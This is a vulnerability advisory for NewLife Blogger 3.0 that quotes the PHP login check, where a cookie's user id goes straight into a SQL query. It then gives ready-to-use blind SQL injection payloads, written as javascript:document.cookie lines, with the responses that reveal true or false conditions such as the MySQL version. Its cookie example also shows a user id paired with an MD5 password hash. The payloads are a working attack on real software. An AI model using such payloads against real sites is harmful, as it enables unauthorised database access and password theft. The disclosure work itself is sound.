NewLife Blogger <= 3.0 Insecure Cookie Handling / SQL Injection Vuln
====================================================================


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
NewLife Blogger <= v3.0 / Insecure Cookie Handling & SQL Injection Vulnerability 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

$ Program: NewLife Blogger
$ Version: <= 3.0
$ File affected: system/nlb_user.class.php
$ Download: http://sourceforge.net/projects/nlb/


Found by Pepelux <pepelux[at]enye-sec.org>
eNYe-Sec - www.enye-sec.org


Cookie format is:
nlb3=7::96e79218965eb72c92a549dd5a330112
nlb3=iduser::md5 pass

--Bug --

143.	function checkLogin( ) {
144.		// loing check
145.		if( isset( $_COOKIE[&#039;nlb3&#039;] ) ) {
146.			$data = explode( &#039;::&#039;, $_COOKIE[&#039;nlb3&#039;] );
147.			$id = $data[0];
148.			$pass = $data[1];
149.			$fromdb = $this->sql->getArray(&#039;SELECT password FROM &#039; . db_users . &#039; WHERE user_id = &#039; . $id . &#039; LIMIT 1;&#039;);
150.			if( $pass === $fromdb[&#039;password&#039;] ) {
151.				$this->setid( $id );
152.				$this->isLogedIn = true;
153.			} else {
154.				$this->isLogedIn = false;
155.			}
156.		}
157.		// we also check for banned users
158.		$this->checkBanned();
159.	}


-- Exploit --

True/false method to blind mysql injection. Examples:

javascript:document.cookie = "nlb3=7 and 1=1::96e79218965eb72c92a549dd5a330112"
Response: You appears as logged in

javascript:document.cookie = "nlb3=7 and 1=0::96e79218965eb72c92a549dd5a330112"
Response: You appears as not logged in

javascript:document.cookie = "nlb3=7 and (select substring(version(),1,1))=4::96e79218965eb72c92a549dd5a330112
Response: You appears as logged in if MySQL version is 4

javascript:document.cookie = "nlb3=7 and (select substring(version(),1,1))=5::96e79218965eb72c92a549dd5a330112
Response: You appears as logged in if MySQL version is 5



